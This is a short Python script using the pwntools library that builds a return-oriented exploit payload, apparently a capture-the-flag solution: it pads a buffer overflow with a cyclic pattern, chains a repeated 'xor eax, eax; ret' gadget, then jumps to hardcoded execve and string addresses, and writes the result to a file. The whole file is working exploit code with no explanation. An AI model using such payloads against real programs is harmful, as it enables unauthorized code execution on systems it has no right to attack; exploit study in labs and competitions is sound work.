#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

payload  = cyclic(0x20)
payload += flat(0x555d203f) * 0xc # nop; xor eax, eax; ret
payload += flat(0x5561676a, 0x55565d3c) # execve; "h"

with open("payload", "wb") as f:
    f.write(payload)
